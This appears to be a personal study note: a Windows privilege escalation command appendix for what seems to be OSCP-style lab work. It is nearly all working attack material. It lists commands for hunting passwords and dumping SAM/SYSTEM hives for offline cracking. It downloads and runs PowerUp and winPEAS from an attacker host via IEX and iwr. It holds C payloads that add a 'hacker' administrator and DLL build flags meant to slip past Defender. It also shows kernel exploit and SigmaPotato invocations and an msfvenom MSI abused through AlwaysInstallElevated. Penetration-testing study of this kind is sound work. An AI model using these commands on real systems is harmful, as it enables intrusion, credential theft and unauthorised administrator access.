# Windows Privilege Escalation, Command Appendix

Part of [[COMMAND APPENDIX]]. Exact syntax for Module 17 techniques. Phase-by-phase methodology: [[Windows Methodology#Phase 3: Privilege Escalation|Windows Methodology Phase 3]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]]. Full technique writeups with lab walkthroughs: [[Windows Privilege Escalation]].

---

## Situational Awareness

```powershell
# Token, groups, privileges
whoami /all
whoami /priv
whoami /groups

# Local users and groups
net user
net localgroup
net localgroup Administrators
net user <username>

# System info
systeminfo
hostname

# Network
ipconfig /all
route print
netstat -ano

# Processes
tasklist /v
Get-Process | Select-Object Name,Id,Path | Sort-Object Name

# Services
wmic service get name,displayname,pathname,startmode
sc.exe query type= all state= all
Get-CimInstance -Class Win32_Service | Select-Object Name,State,PathName,StartName

# Installed software
wmic product get name,version
Get-CimInstance -Class Win32_InstalledWin32Program | Select-Object Name,Version

# Installed patches
wmic qfe list
Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Sort-Object HotFixID
```

---

## Sensitive Info Hunting

```powershell
# PSReadLine command history (typed credentials often end up here)
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
# All users (needs read access to their profiles):
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content

# Transcript files
Get-ChildItem C:\Users\*\Documents\PowerShell* -Recurse -ErrorAction SilentlyContinue
Get-ChildItem "C:\Windows\system32" -Filter "*transcript*" -ErrorAction SilentlyContinue

# Files containing passwords
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","secret" -ErrorAction SilentlyContinue

# Desktop and Documents text files
Get-ChildItem C:\Users\*\Desktop\*.txt -ErrorAction SilentlyContinue | Get-Content
Get-ChildItem "C:\Users\*\Documents\*.txt" -ErrorAction SilentlyContinue | Get-Content

# Saved credentials / credential manager
cmdkey /list

# Registry AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# DPAPI masterkeys (Seatbelt finds these)
.\Seatbelt.exe DpapiMasterKeys

# Interesting file types
Get-ChildItem -Path C:\Users\ -Recurse -Include *.kdbx,*.rdg,*.vnc,*.rdp,*.cred,*.bak -ErrorAction SilentlyContinue
```

---

## Automated Enumeration

```powershell
# winPEAS
iwr -uri http://<kali-ip>/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe | Tee-Object -FilePath winpeas_out.txt

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/PowerUp.ps1')
Invoke-AllChecks
# Individual checks:
Get-ModifiableServiceFile     # binary is writable
Get-UnquotedService           # unquoted path + writable dir
Get-ModifiableService         # service config writable (binPath)

# Seatbelt
iwr -uri http://<kali-ip>/Seatbelt.exe -OutFile Seatbelt.exe
.\Seatbelt.exe -group=all
.\Seatbelt.exe DpapiMasterKeys InstalledProducts PowerShellHistory
```

---

## Service Binary Hijacking

```powershell
# Check ACLs on a service binary
icacls "C:\Path\to\service.exe"
# Target perms: BUILTIN\Users:(F), (W), or (M)

# Find the service binary path
wmic service where name="ServiceName" get pathname
(Get-CimInstance -Class Win32_Service -Filter "Name='ServiceName'").PathName
```

Payload (adduser.c), compile on Kali:
```bash
x86_64-w64-mingw32-gcc -o payload.exe adduser.c -ladvapi32
```
```c
#include <stdlib.h>
int main() {
    system("net user hacker Passw0rd! /add");
    system("net localgroup Administrators hacker /add");
    return 0;
}
```

Restart trigger:
```cmd
sc.exe stop ServiceName
sc.exe start ServiceName
```
```powershell
Restart-Service ServiceName -Force
# Or via WMI:
(Get-WmiObject Win32_Service -Filter "Name='ServiceName'").StopService()
(Get-WmiObject Win32_Service -Filter "Name='ServiceName'").StartService()
```

---

## DLL Hijacking

```powershell
# Check if the service's directory is user-writable
icacls "C:\Path\to\service\dir\"
# BUILTIN\Users:(W) or (M) or (F) = can plant a DLL

# Check service log for 'Couldn't load' messages
type C:\Path\to\service\dir\ServiceName.log
```

Compile DLL payload on Kali (nostdlib = smaller, Defender-friendlier):
```bash
x86_64-w64-mingw32-gcc -shared -nostdlib -nostartfiles \
  -fno-stack-check -mno-stack-arg-probe \
  -Wl,--entry,DllMainCRTStartup \
  -o MissingDll.dll payload.c \
  -lkernel32 -ladvapi32
```

If the compile fails with `undefined reference to '___chkstk_ms'`: you forgot `-fno-stack-check -mno-stack-arg-probe`.

Check for DLL after upload (confirm not quarantined by Defender):
```powershell
Get-Item "C:\Path\to\service\dir\MissingDll.dll" | Select-Object Length,LastWriteTime
```

Read flag via SeBackupPrivilege (DLL payload, runs as Backup Operators service account):
```c
// FILE_FLAG_BACKUP_SEMANTICS bypasses ACL checks when SeBackupPrivilege is active
HANDLE hIn = CreateFileW(L"C:\\Target\\flag.txt",
    GENERIC_READ, FILE_SHARE_READ, NULL,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
```

Dump SAM/SYSTEM hives (fallback when flag isn't directly readable):
```c
HKEY hSam;
RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", REG_OPTION_BACKUP_RESTORE, KEY_READ, &hSam);
RegSaveKeyExW(hSam, L"C:\\Temp\\cfg1.db", NULL, REG_NO_COMPRESSION);
```

---

## Unquoted Service Path

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```
```powershell
Get-UnquotedService   # PowerUp
Get-CimInstance -Class Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '"'} | Select-Object Name,PathName
```

Check which component directory is writable:
```powershell
icacls "C:\Program Files\Vuln App\"
# If writable: plant payload at the first space-ambiguous component
# e.g. path is C:\Program Files\Vuln App\service.exe
# → plant C:\Program Files\Vuln.exe (Windows tries this first)
```

```cmd
sc start ServiceName
```

---

## Scheduled Tasks

```powershell
# Full task list
schtasks /query /fo LIST /v

# PowerShell - filter out system tasks, find non-standard users
Get-ScheduledTask | Where-Object {$_.Principal.UserId -notin @("SYSTEM","LOCAL SERVICE","NETWORK SERVICE","Users","Administrators","INTERACTIVE")} | Select-Object TaskName,@{N="Binary";E={$_.Actions.Execute}},@{N="Args";E={$_.Actions.Arguments}},@{N="User";E={$_.Principal.UserId}},@{N="Next";E={(Get-ScheduledTaskInfo $_).NextRunTime}}

# Check a specific task's binary ACL
icacls "C:\Path\to\task\binary.exe"

# Check task next run time
(Get-ScheduledTaskInfo -TaskName "TaskName").NextRunTime
```

Replace writable binary with reverse shell payload, wait for task to fire.

---

## Service DACL / Restart Rights

```cmd
# Read service DACL (shows who has start/stop rights)
sc sdshow ServiceName
# SDDL RP = SERVICE_START, WP = SERVICE_STOP
# RID in parentheses: Get-LocalUser | Where-Object {$_.SID -match '1003$'}

# Check service failure actions (will it auto-restart?)
sc qfailure ServiceName
```

---

## Kernel Exploits (OSCP-era)

```powershell
# Check patch level
Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Sort-Object HotFixID | Select-Object HotFixID,InstalledOn
```

**CVE-2023-29360** (KB5027215 absent):
```powershell
# Needs RDP for interactive shell, or pass command arg:
.\CVE-2023-29360.exe   # spawns SYSTEM cmd.exe interactively
.\CVE-2023-29360.exe "cmd.exe /c net user hacker Passw0rd! /add"
```

**CVE-2023-28252 (bkstephen)** (KB5025221 / KB5025224 absent):
```cmd
# Pass a command to run as SYSTEM (write output to file for non-interactive shells)
clfs_eop.exe "cmd.exe /c whoami > C:\Temp\out.txt"
clfs_eop.exe "cmd.exe /c type C:\Users\target\Desktop\flag.txt > C:\Temp\flag.txt"
type C:\Temp\flag.txt
```
Note: needs write access to `C:\Users\Public\`. If denied over WinRM, try from a different shell context (nc bind shell, reverse shell).

---

## SeImpersonatePrivilege

```powershell
whoami /priv   # confirm SeImpersonatePrivilege Enabled

# SigmaPotato (modern, no CLSID needed, works Win10/11/2019/2022)
iwr -uri http://<kali-ip>/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato.exe "net user hacker Passw0rd! /add"
.\SigmaPotato.exe "net localgroup Administrators hacker /add"

# Then connect as hacker:
evil-winrm -i <target-ip> -u hacker -p Passw0rd!
```

---

## SeBackupPrivilege (Backup Operators)

```powershell
whoami /groups   # BUILTIN\Backup Operators

# Dump SAM and SYSTEM hives for offline cracking
reg save HKLM\SAM C:\Temp\sam.bak /y
reg save HKLM\SYSTEM C:\Temp\system.bak /y
# Download to Kali:
download C:\Temp\sam.bak   # evil-winrm
download C:\Temp\system.bak

# Crack offline:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

---

## AlwaysInstallElevated

```powershell
# Both keys must be 1 for exploit to work
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```
```bash
# Generate payload on Kali
msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi -o shell.msi
python3 -m http.server 8080
```
```cmd
msiexec /quiet /qn /i \\<kali-ip>\share\shell.msi
# Or after downloading:
msiexec /quiet /qn /i C:\Temp\shell.msi
```

---

#### Tags: #WindowsPrivesc #CommandAppendix #Module17 #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #ScheduledTasks #KernelExploit #SeImpersonatePrivilege #SeBackupPrivilege #winPEAS #PowerUp #SigmaPotato #CVE202328252 #CVE202329360
